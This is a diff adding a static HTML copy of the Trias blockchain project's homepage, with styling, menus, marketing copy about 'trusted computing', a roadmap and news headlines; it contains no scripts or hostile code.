+          .hKgNvZ .tips { font-weight: 300; font-size: 10rem; line-height: 10rem; }
+        }
+    </style>
+    <link rel="stylesheet" type="text/css" href="p__Home__index.0e3521b1.chunk.css">
+    <style data-emotion="css" data-s="">
+        @media print {
+          .css-1k371a6 { position: absolute !important; }
+        }
+        .css-h5z058 { position: fixed; z-index: 1300; inset: 0px; visibility: hidden; }
+        @media print {
+          .css-h5z058 { position: absolute !important; }
+        }
+        .css-1mbdz04 { z-index: -1; }
+        .css-919eu4 { position: fixed; display: flex; -moz-box-align: center; align-items: center; -moz-box-pack: center; justify-content: center; inset: 0px; background-color: rgba(0, 0, 0, 0.5); z-index: -1; }
+        .css-ekeie0 { height: 100%; outline: 0px; display: flex; -moz-box-pack: center; justify-content: center; -moz-box-align: center; align-items: center; }
+        @media print {
+          .css-ekeie0 { height: auto; }
+        }
+        .css-9z6bze { margin: 32px; position: relative; overflow-y: auto; display: flex; flex-direction: column; max-height: calc(100% - 64px); max-width: calc(100% - 64px); width: calc(100% - 64px); }
+        @media print {
+          .css-9z6bze { overflow-y: visible; box-shadow: none; }
+        }
+        .css-skyjmu { background-color: rgb(255, 255, 255); color: rgba(0, 0, 0, 0.87); transition: box-shadow 300ms cubic-bezier(0.4, 0, 0.2, 1); border-radius: 4px; box-shadow: rgba(0, 0, 0, 0.2) 0px 11px 15px -7px, rgba(0, 0, 0, 0.14) 0px 24px 38px 3px, rgba(0, 0, 0, 0.12) 0px 9px 46px 8px; margin: 32px; position: relative; overflow-y: auto; display: flex; flex-direction: column; max-height: calc(100% - 64px); max-width: calc(100% - 64px); width: calc(100% - 64px); }
+        @media print {
+          .css-skyjmu { overflow-y: visible; box-shadow: none; }
+        }
+    </style>
+    <title>Trias | Link the world with trust</title>
+ 
+</head>
+
+<body>
+    <div id="root">
+        <div data-rk="">
+            <style>
+                [data-rk]{--rk-blurs-modalOverlay:blur(4px);--rk-fonts-body:-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";--rk-radii-actionButton:4px;--rk-radii-connectButton:4px;--rk-radii-menuButton:4px;--rk-radii-modal:8px;--rk-radii-modalMobile:8px;--rk-colors-accentColor:#51E0CF;--rk-colors-accentColorForeground:#000000;--rk-colors-actionButtonBorder:rgba(255, 255, 255, 0.04);--rk-colors-actionButtonBorderMobile:rgba(255, 255, 255, 0.08);--rk-colors-actionButtonSecondaryBackground:rgba(255, 255, 255, 0.08);--rk-colors-closeButton:rgba(224, 232, 255, 0.6);--rk-colors-closeButtonBackground:rgba(255, 255, 255, 0.08);--rk-colors-connectButtonBackground:#1A1B1F;--rk-colors-connectButtonBackgroundError:#FF494A;--rk-colors-connectButtonInnerBackground:linear-gradient(0deg, rgba(255, 255, 255, 0.075), rgba(255, 255, 255, 0.15));--rk-colors-connectButtonText:#FFF;--rk-colors-connectButtonTextError:#FFF;--rk-colors-connectionIndicator:#30E000;--rk-colors-downloadBottomCardBackground:linear-gradient(126deg, rgba(0, 0, 0, 0) 9.49%, rgba(120, 120, 120, 0.2) 71.04%), #1A1B1F;--rk-colors-downloadTopCardBackground:linear-gradient(126deg, rgba(120, 120, 120, 0.2) 9.49%, rgba(0, 0, 0, 0) 71.04%), #1A1B1F;--rk-colors-error:#FF494A;--rk-colors-generalBorder:rgba(255, 255, 255, 0.08);--rk-colors-generalBorderDim:rgba(255, 255, 255, 0.04);--rk-colors-menuItemBackground:rgba(224, 232, 255, 0.1);--rk-colors-modalBackdrop:rgba(0, 0, 0, 0.5);--rk-colors-modalBackground:#1A1B1F;--rk-colors-modalBorder:rgba(255, 255, 255, 0.08);--rk-colors-modalText:#FFF;--rk-colors-modalTextDim:rgba(224, 232, 255, 0.3);--rk-colors-modalTextSecondary:rgba(255, 255, 255, 0.6);--rk-colors-profileAction:rgba(224, 232, 255, 0.1);--rk-colors-profileActionHover:rgba(224, 232, 255, 0.2);--rk-colors-profileForeground:rgba(224, 232, 255, 0.05);--rk-colors-selectedOptionBorder:rgba(224, 232, 255, 0.1);--rk-colors-standby:#FFD641;--rk-shadows-connectButton:0px 4px 12px rgba(0, 0, 0, 0.1);--rk-shadows-dialog:0px 8px 32px rgba(0, 0, 0, 0.32);--rk-shadows-profileDetailsAction:0px 2px 6px rgba(37, 41, 46, 0.04);--rk-shadows-selectedOption:0px 2px 6px rgba(0, 0, 0, 0.24);--rk-shadows-selectedWallet:0px 2px 6px rgba(0, 0, 0, 0.24);--rk-shadows-walletLogo:0px 2px 16px rgba(0, 0, 0, 0.16);}
+            </style>
+            <div class="bodyDom">
+                <div class="headerBox" style="background: none; backdrop-filter: none;">
+                    <section class="sc-fbkieD lbcRxI">
+                        <div class="sc-Gqece gfwKch"><img src="82ae9bf64014277c1276435865329b7d681f0798.png" alt="Trias Logo" class="sc-fWSCoS bbqcEh">
+                            <div class="sc-aelVe giua-DR">
+                                <section class="sc-nFrIV ifqumc">
+                                    <div class="sc-higXfs GtKJY">
+                                        <div class="sc-lcuiaG eXkxCW">
+                                            <div class="sc-laRQQM jWrZJ">
+                                                <div class="sc-iNqNmV gLYxjM">
+                                                    <p class="">Future</p>
+                                                </div>
+                                                <div class="sc-jeGSXX kajKRg undefined"></div>
+                                            </div>
+                                            <div class="sc-laRQQM jWrZJ">
+                                                <div class="sc-iNqNmV gLYxjM">
+                                                    <p class="">Learn</p><img class="expand" src="d1eb4bbc24a0883e357bcd9538e2c320d378aca9.png" alt="more btn">
+                                                </div>
+                                                <div class="sc-jeGSXX kajKRg learn">
+                                                    <div class="sc-eJMOVy jQXtec cont-line">
+                                                        <div class="title">TrustedFi</div>
+                                                        <div class="tips">Driven by innovation, disrupting the traditional financial model</div>
+                                                    </div>
+                                                    <div class="sc-eJMOVy jQXtec cont-line">
+                                                        <div class="title">Economy</div>
+                                                        <div class="tips">Explore the Trias Economic System</div>
+                                                    </div>
+                                                    <div class="sc-eJMOVy jQXtec cont-line">
+                                                        <div class="title">Technology</div>
+                                                        <div class="tips">Architecture, Trusted Computing, etc.</div>
+                                                    </div>
+                                                    <div class="sc-eJMOVy jQXtec cont-line">
+                                                        <div class="title">Governance</div>
+                                                        <div class="tips">The community philosophy: Open, fair justice, autonomous contribution, shared</div>
+                                                    </div>
+                                                    <div class="sc-eJMOVy jQXtec cont-line">
+                                                        <div class="title">About Trias</div>
+                                                        <div class="tips">Meet our team and hear our origin story</div>
+                                                    </div>
+                                                    <div class="sc-eJMOVy jQXtec cont-line">
+                                                        <div class="title">Join Trias<img class="jump" src="0ee975c31127ec3cb4da104c3e475d22b3441083.svg" alt=""></div>
+                                                        <div class="tips">Explore trusted computing with Trias</div>
+                                                    </div>
+                                                    <div class="sc-eJMOVy jQXtec cont-line">
+                                                        <div class="title">Medium<img class="jump" src="0ee975c31127ec3cb4da104c3e475d22b3441083.svg" alt=""></div>
+                                                        <div class="tips">Stay up to date on all the latest Trias news, developments, and events</div>
+                                                    </div>
+                                                    <div class="sc-eJMOVy jQXtec cont-line">
+                                                        <div class="title">Trias Whitepaper<img class="jump" src="0ee975c31127ec3cb4da104c3e475d22b3441083.svg" alt=""></div>
+                                                        <div class="tips">Read the latest whitepaper of Trias</div>
+                                                    </div>
+                                                    <div class="sc-eJMOVy jQXtec cont-line">
+                                                        <div class="title">Brand Resources<img class="jump" src="0ee975c31127ec3cb4da104c3e475d22b3441083.svg" alt=""></div>
+                                                        <div class="tips">Download logos and visual elements of the Trias brand</div>
+                                                    </div>
+                                                    <div class="sc-eJMOVy jQXtec cont-line">
+                                                        <div class="title">Developer Docs<img class="jump" src="0ee975c31127ec3cb4da104c3e475d22b3441083.svg" alt=""></div>
+                                                        <div class="tips">Supporting docs for developers</div>
+                                                    </div>
+                                                    <div class="sc-eJMOVy jQXtec cont-line">
+                                                        <div class="title">Roadmap<img class="jump" src="0ee975c31127ec3cb4da104c3e475d22b3441083.svg" alt=""></div>
+                                                        <div class="tips">An outline of the launch and ongoing evolution of Trias</div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="sc-laRQQM jWrZJ">
+                                                <div class="sc-iNqNmV gLYxjM">
+                                                    <p class="">Participate</p><img class="expand" src="d1eb4bbc24a0883e357bcd9538e2c320d378aca9.png" alt="more btn">
+                                                </div>
+                                                <div class="sc-jeGSXX kajKRg participate">
+                                                    <div class="sc-eJMOVy jQXtec cont-line">
+                                                        <div class="title">Bridge</div>
+                                                        <div class="tips">Transfer $TRIAS between different chains</div>
+                                                    </div>
+                                                    <div class="sc-eJMOVy jQXtec cont-line">
+                                                        <div class="title">Migrate</div>
+                                                        <div class="tips">Migrate your $TRIAS to the NetX Network</div>
+                                                    </div>
+                                                    <div class="sc-eJMOVy jQXtec cont-line">
+                                                        <div class="title">Convert</div>
+                                                        <div class="tips">Get New TRIAS(BSC)</div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </section>
+                                <div class="sc-dwfTHb gWCAvx">
+                                    <div style="">
+                                        <div class="sc-eggLLm hscfvH"><img src="2abf16c226080d2fbd543caf770b1a386b3e461d.png" alt="">Connect Wallet</div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </section>
+                </div>
+                <div class="container">
+                    <div bgimg="/static/home1.3e2e6929.png" class="sc-bdfCDU zGSBB">
+                        <div class="home1">
+                            <div class="logoDom"></div>
+                            <div class="text1">Trustworthy and Reliable Intelligent Autonomous Systems</div>
+                            <div class="text2">Build a trust foundation, reshape the trust system, enable trust interactions, and embark on the WEB3 trust chapter.</div>
+                        </div>
+                    </div>
+                    <div bgimg="/static/home2.f109ee21.png" class="sc-bdfCDU gTaGtW move">
+                        <div class="home2">
+                            <div class="text">Trias Layer '-1 ' Trust Network</div>
+                            <div class="text1">Build Layer '-1' network through trusted computing to achieve interchain interoperability with multiple Layer 1 chains. Simultaneously, leverage cloud computing technology to expedite the transition from Web2 to Web3.</div>
+                        </div>
+                    </div>
+                    <div bgimg="/static/home3.b89f4719.png" class="sc-bdfCDU jXeLbA">
+                        <div class="home3">
+                            <div class="topDom">
+                                <div class="text">Link the world with trust</div>
+                                <div class="text1">Utilizing a core blockchain solution to establish a reliable infrastructure for trusted interactions, Trias ensures that trust is rooted in machines, steadfastly guaranteeing machines will deterministically 'do what they are instructed to do.'</div><a href="https://www.trias.one/future">
+                                    <div class="routeImgDom">
+                                        <div class="routeImg"></div>
+                                        <div class="icon"></div>
+                                    </div>
+                                </a>
+                            </div>
+                            <div class="bottomDom">
+                                <div class="item"><img src="home3_img1@2x.14c71e9f.png" alt="">
+                                    <div class="tit">Separation of powers model</div>
+                                    <div class="text">At its core, with the principle of power separation, it has created a digital ecosystem that promotes fairness and justice for users.</div>
+                                </div>
+                                <div class="item"><img src="home3_img2@2x.cae0a1d7.png" alt="">
+                                    <div class="tit">Top-notch technical capability</div>
+                                    <div class="text">Through groundbreaking collaboration with Oxford-Octa Digital Economy Lab, we consistently stand at the forefront of the industry.</div>
+                                </div>
+                                <div class="item"><img src="home3_img3@2x.ad34a1f2.png" alt="">
+                                    <div class="tit">Enterprise-level Application System</div>
+                                    <div class="text">Building a comprehensive and trustworthy network ecosystem, leading the new era of digitalization for enterprises.</div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div bgimg="/static/home4.c1dc6ce2.png" class="sc-bdfCDU brFhQO">
+                        <div class="home4">
+                            <div class="container">
+                                <div class="text">Trias Product Showcase</div>
+                                <div class="swiperDom">
+                                    <div class="ant-carousel css-2q8sxy">
+                                        <div class="slick-slider itemContainer slick-initialized" dir="ltr">
+                                            <div class="slick-list">
+                                                <div class="slick-track" style="width: 13321px; opacity: 1;">
+                                                    <div data-index="0" class="slick-slide" tabindex="-1" aria-hidden="true" style="outline: none; width: 1211px; position: relative; left: 0px; opacity: 0; transition: opacity 500ms, visibility 500ms;">
+                                                        <div>
+                                                            <div class="itemList" tabindex="-1" style="width: 100%; display: inline-block;"><img src="swiper2@2x.3767a38b.png" alt=""></div>
+                                                        </div>
+                                                    </div>
+                                                    <div data-index="1" class="slick-slide" tabindex="-1" aria-hidden="true" style="outline: none; width: 1211px; position: relative; left: -1211px; opacity: 0; transition: opacity 500ms, visibility 500ms;">
+                                                        <div>
+                                                            <div class="itemList" tabindex="-1" style="width: 100%; display: inline-block;"><img src="swiper3@2x.1296d7eb.png" alt=""></div>
+                                                        </div>
+                                                    </div>
+                                                    <div data-index="2" class="slick-slide" tabindex="-1" aria-hidden="true" style="outline: none; width: 1211px; position: relative; left: -2422px; opacity: 0; transition: opacity 500ms, visibility 500ms;">
+                                                        <div>
+                                                            <div class="itemList" tabindex="-1" style="width: 100%; display: inline-block;"><img src="swiper4@2x.24b386bb.png" alt=""></div>
+                                                        </div>
+                                                    </div>
+                                                    <div data-index="3" class="slick-slide slick-active slick-current" tabindex="-1" aria-hidden="false" style="outline: none; width: 1211px; position: relative; left: -3633px; opacity: 1; transition: opacity 500ms, visibility 500ms;">
+                                                        <div>
+                                                            <div class="itemList" tabindex="-1" style="width: 100%; display: inline-block;"><img src="swiper5@2x.493439c1.png" alt=""></div>
+                                                        </div>
+                                                    </div>
+                                                    <div data-index="4" class="slick-slide" tabindex="-1" aria-hidden="true" style="outline: none; width: 1211px; position: relative; left: -4844px; opacity: 0; transition: opacity 500ms, visibility 500ms;">
+                                                        <div>
+                                                            <div class="itemList" tabindex="-1" style="width: 100%; display: inline-block;"><img src="swiper6@2x.736d9971.png" alt=""></div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div><a href="https://bastet.ethanim.network/" target="_blank">
+                                    <div class="buttons">Bastet</div>
+                                </a>
+                            </div>
+                            <div class="pageContainer">
+                                <div class="pagenations">
+                                    <div class="prev"></div>
+                                    <div class="totList">
+                                        <div class="dots"></div>
+                                        <div class="dots"></div>
+                                        <div class="dots"></div>
+                                        <div class="active dots"></div>
+                                        <div class="dots"></div>
+                                    </div>
+                                    <div class="next"> </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div bgimg="/static/home5.9af1e21c.png" class="sc-bdfCDU hQqoHO">
+                        <div class="home5">
+                            <div class="container">
+                                <div class="leftDom">
+                                    <div class="text">Participate in Trias Development</div>
+                                </div>
+                                <div class="rightDom">
+                                    <div class="items"><img src="f2036b4441fdae90771324713dea04c3dfc0d2a6.svg" alt="">
+                                        <div class="tit">Validator</div>
+                                        <div class="intro">Participate in the Consensus Mechanism to Provide Solid Support for the Stability of Trias Network Security and Trusted Computing.</div>
+                                        <div class="bar"></div>
+                                    </div>
+                                    <div class="items"><img src="3a737263fc427a4ee8b5868b67339b6bf652c13d.png" alt="">
+                                        <div class="tit">Developer</div>
+                                        <div class="intro">Utilize the '-1' layer security cornerstone to build trustworthy distributed applications through the Trias development framework.</div>
+                                        <div class="bar"></div>
+                                    </div>
+                                    <div class="items"><img src="d92ab933f4c5c39d9d285225676acff21fed0fb0.svg" alt="">
+                                        <div class="tit">User</div>
+                                        <div class="intro">Not only participants, but co-creators of trust as well, promoting prosperity in the trusted computing ecosystem.</div>
+                                        <div class="bar"></div>
+                                    </div>
+                                    <div class="items"><img src="b9dcef76e99aefb2c6bea82cf6a95efaf990c467.svg" alt="">
+                                        <div class="tit">Connectors</div>
+                                        <div class="intro">Enable cross-chain interoperability in the Trias-built ecosystem, driving collaborative growth across blockchains.</div>
+                                        <div class="bar"></div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div bgimg="/static/home6.3ee686b9.png" class="sc-bdfCDU eARnCf">
+                        <div class="home6">
+                            <div class="topDom">
+                                <div class="text">Advancing in the Trias Ecosystem</div>
+                                <div class="text1"> Start from here to explore the endless possibilities of trusted computing.</div>
+                            </div>
+                            <div class="cardcontainer">
+                                <div class="item"><img src="PHASE%201@2x.59a92a37.png" alt="">
+                                    <div class="card">
+                                        <div class="tit">PHASE 1</div>
+                                        <div class="text">Construction of '-1' layer trusted technology and network laying</div>
+                                    </div>
+                                </div>
+                                <div class="item"><img src="PHASE%202@2x.7c3c6d98.png" alt="">
+                                    <div class="card">
+                                        <div class="tit">PHASE 2</div>
+                                        <div class="text">Fusion of trusted networks and cloud computing precipitates change</div>
+                                    </div>
+                                </div>
+                                <div class="item"><img src="PHASE%203@2x.a5af1ea8.png" alt="">
+                                    <div class="card">
+                                        <div class="tit">PHASE 3</div>
+                                        <div class="text">Sustained development of trusted finance with RWA (Real World Assets)</div>
+                                    </div>
+                                </div>
+                                <div class="item"><img src="PHASE%204@2x.8ba3f585.png" alt="">
+                                    <div class="card">
+                                        <div class="tit">PHASE 4</div>
+                                        <div class="text">Trusted infrastructure for interactive development between computers and the world</div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div bgimg="" style="background: rgb(9, 9, 11);" class="sc-bdfCDU coOUiT">
+                        <div class="home7">
+                            <div class="topDom">
+                                <div class="text">The latest news from Trias</div>
+                                <div class="text1">Stay up to date with all the latest Trias platform announcements, community events, technical developments, etc.</div><a>
+                                    <div class="routeImgDom">
+                                        <div class="routeImg"></div>
+                                        <div class="icon"></div>
+                                    </div>
+                                </a>
+                            </div>
+                            <div class="bottomDom">
+                                <div class="item"><img src="1_2iD9svHN0xzCbJr6xfSB-w.jpg" alt="">
+                                    <div class="tit">Trias Weekly Updates(November 11 — November 17, 2024)</div>
+                                    <div class="time"><span>2024-11-19 04:55:42</span><span></span></div>
+                                </div>
+                                <div class="item"><img src="1_QFLJd0OUi6JmBsrqSGTWJg.png" alt="">
+                                    <div class="tit">Announcement on further expansion of cooperation ecosystem and liquidity migration</div>
+                                    <div class="time"><span>2024-11-14 09:25:56</span><span></span></div>
+                                </div>
+                                <div class="item"><img src="1_hsO_AMDxumS5lInmF21hGQ.jpg" alt="">
+                                    <div class="tit">Building the Future: Cooperation and Development of the Trias Ecosystem</div>
+                                    <div class="time"><span>2024-11-10 06:17:30</span><span></span></div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="footerBox">
+                    <section class="sc-hOqshF jEEjgI">
+                        <div class="sc-dtwofg fpFRNG"></div>
+                        <div class="sc-dacFVT eWDokj"><img src="82ae9bf64014277c1276435865329b7d681f0798.png" alt="logo" class="sc-jUElsq fRlAaG">
+                            <div class="sc-jQbKEx iPNNJH">Link the world with trust</div>
+                        </div>
+                        <div class="sc-fbNYsL euiaVl">
+                            <div class="sc-hlTxfo gbqQKM">
+                                <div class="sc-eLgOxx sRhKl">
+                                    <p>Trias</p>
+                                </div>
+                                <div class="sc-bTvRvy krnXIw trias">
+                                    <div class="sc-kIeSmD bspUEi cont-line-trias">
+                                        <div class="title">Future</div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="sc-hlTxfo gbqQKM">
+                                <div class="sc-eLgOxx sRhKl">
+                                    <p>Learn</p>
+                                </div>
+                                <div class="sc-bTvRvy krnXIw learn">
+                                    <div class="sc-kIeSmD bspUEi cont-line-learn">
+                                        <div class="title">TrustedFi</div>
+                                    </div>
+                                    <div class="sc-kIeSmD bspUEi cont-line-learn">
+                                        <div class="title">Economy</div>
+                                    </div>
+                                    <div class="sc-kIeSmD bspUEi cont-line-learn">
+                                        <div class="title">Technology</div>
+                                    </div>
+                                    <div class="sc-kIeSmD bspUEi cont-line-learn">
+                                        <div class="title">Governance</div>
+                                    </div>
+                                    <div class="sc-kIeSmD bspUEi cont-line-learn">
+                                        <div class="title">About Trias</div>
+                                    </div>
+                                    <div class="sc-kIeSmD bspUEi cont-line-learn">
+                                        <div class="title">Join Trias<img class="jump" src="0ee975c31127ec3cb4da104c3e475d22b3441083.svg" alt=""></div>
+                                    </div>
+                                    <div class="sc-kIeSmD bspUEi cont-line-learn">
+                                        <div class="title">Medium<img class="jump" src="0ee975c31127ec3cb4da104c3e475d22b3441083.svg" alt=""></div>
+                                    </div>
+                                    <div class="sc-kIeSmD bspUEi cont-line-learn">
+                                        <div class="title">Trias Whitepaper<img class="jump" src="0ee975c31127ec3cb4da104c3e475d22b3441083.svg" alt=""></div>
+                                    </div>
+                                    <div class="sc-kIeSmD bspUEi cont-line-learn">
+                                        <div class="title">Brand Resources<img class="jump" src="0ee975c31127ec3cb4da104c3e475d22b3441083.svg" alt=""></div>
+                                    </div>
+                                    <div class="sc-kIeSmD bspUEi cont-line-learn">
+                                        <div class="title">Developer Docs<img class="jump" src="0ee975c31127ec3cb4da104c3e475d22b3441083.svg" alt=""></div>
+                                    </div>
+                                    <div class="sc-kIeSmD bspUEi cont-line-learn">
+                                        <div class="title">Roadmap<img class="jump" src="0ee975c31127ec3cb4da104c3e475d22b3441083.svg" alt=""></div>
+                                    </div>
+                                    <div class="sc-kIeSmD bspUEi cont-line-learn">
+                                        <div class="title">Terms of Service<img class="jump" src="0ee975c31127ec3cb4da104c3e475d22b3441083.svg" alt=""></div>
+                                    </div>
+                                    <div class="sc-kIeSmD bspUEi cont-line-learn">
+                                        <div class="title">Privacy Policy<img class="jump" src="0ee975c31127ec3cb4da104c3e475d22b3441083.svg" alt=""></div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="sc-hlTxfo gbqQKM">
+                                <div class="sc-eLgOxx sRhKl">
+                                    <p>Participate</p>
+                                </div>
+                                <div class="sc-bTvRvy krnXIw participate">
+                                    <div class="sc-kIeSmD bspUEi cont-line-participate">
+                                        <div class="title">Bridge</div>
+                                    </div>
+                                    <div class="sc-kIeSmD bspUEi cont-line-participate">
+                                        <div class="title">Migrate</div>
+                                    </div>
+                                    <div class="sc-kIeSmD bspUEi cont-line-participate">
+                                        <div class="title">Convert</div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </section>
+                    <div class="sc-GTUqm hKgNvZ">
+                        <div class="tips">Copyright © Trias-lab Foundation. All Rights Reserved</div>
+                        <div class="sc-cOaiZO cFywCQ"><a href="https://x.com/triaslab" target="_blank" class="icon" rel="noopener noreferrer"><img src="582958d05f3dfc70edc8c982e5fc5ff4b0def91f.svg" alt="twitter"></a><a href="https://discord.com/invite/npHRqa7uph" target="_blank" class="icon" rel="noopener noreferrer"><img src="c44db3e8267209f954a7c7cd9697463caf95713e.svg" alt="discord"></a><a href="https://t.me/triaslab" target="_blank" class="icon" rel="noopener noreferrer"><img src="d3df3d0f7a04827afdef482fb63e4d9c2f088d40.svg" alt="telegram"></a><a href="https://triaslab.medium.com/" target="_blank" class="icon" rel="noopener noreferrer"><img src="78d99ea29752a0fd9845494b8a922145dc3b2924.svg" alt="medium"></a><a href="https://github.com/trias-lab/Documentation" target="_blank" class="icon" rel="noopener noreferrer"><img src="14199990162e6b8dae78becf58b2b55d6c8dea3f.svg" alt="github"></a><a href="mailto:contact@trias.one" target="_blank" class="icon" rel="noopener noreferrer"><img src="a923fecdad97b7d34a92157559ecdad5422de5ea.svg" alt="email"></a></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div role="presentation" class="MuiDialog-root MuiModal-root MuiModal-hidden css-h5z058" aria-hidden="true">
+        <div aria-hidden="true" class="MuiBackdrop-root MuiModal-backdrop css-919eu4" style="opacity: 0; visibility: hidden;"></div>
+        <div tabindex="-1" data-testid="sentinelStart"></div>
+        <div class="MuiDialog-container MuiDialog-scrollPaper css-ekeie0" style="opacity: 0; visibility: hidden;" role="presentation" tabindex="-1">
+            <div class="MuiPaper-root MuiPaper-elevation MuiPaper-rounded MuiPaper-elevation24 MuiDialog-paper MuiDialog-paperScrollPaper MuiDialog-paperWidthFalse MuiDialog-paperFullWidth css-skyjmu" role="dialog" aria-describedby="alert-dialog-slide-description" aria-labelledby=":r0:">
+                <div class="sc-AzfvX bmMlRC"><img src="a8d7986ab1e5af93c0bfe8da886e9f4f432ebd65.png" alt="Close modal" class="sc-khAlqs fKIaGy"><img src="maintain@2x.42aa39b1.png" alt="PC modal image" class="sc-hTZhMB gDtChJ">
+                    <div class="sc-jgHCeW jxsFQJ">Notice</div>
+                    <div class="sc-gTgyBf gdPvVy">Please enjoy more exciting features on PC.</div>
+                </div>
+            </div>
+        </div>
+        <div tabindex="-1" data-testid="sentinelEnd"></div>
+    </div>
+    <div role="presentation" class="MuiDialog-root MuiModal-root MuiModal-hidden css-h5z058" aria-hidden="true">
+        <div aria-hidden="true" class="MuiBackdrop-root MuiModal-backdrop css-919eu4" style="opacity: 0; visibility: hidden;"></div>
+        <div tabindex="-1" data-testid="sentinelStart"></div>
+        <div class="MuiDialog-container MuiDialog-scrollPaper css-ekeie0" style="opacity: 0; visibility: hidden;" role="presentation" tabindex="-1">
+            <div class="MuiPaper-root MuiPaper-elevation MuiPaper-rounded MuiPaper-elevation24 MuiDialog-paper MuiDialog-paperScrollPaper MuiDialog-paperWidthFalse MuiDialog-paperFullWidth css-skyjmu" role="dialog" aria-describedby="alert-dialog-slide-description" aria-labelledby=":r1:">
+                <div class="sc-AzfvX bmMlRC"><img src="a8d7986ab1e5af93c0bfe8da886e9f4f432ebd65.png" alt="Close modal" class="sc-khAlqs fKIaGy"><img src="maintain@2x.42aa39b1.png" alt="PC modal image" class="sc-hTZhMB gDtChJ">
+                    <div class="sc-jgHCeW jxsFQJ">Notice</div>
+                    <div class="sc-gTgyBf gdPvVy">Please enjoy more exciting features on PC.</div>
+                </div>
+            </div>
+        </div>
+        <div tabindex="-1" data-testid="sentinelEnd"></div>
+    </div>
+   
+</body>
+
+</html>
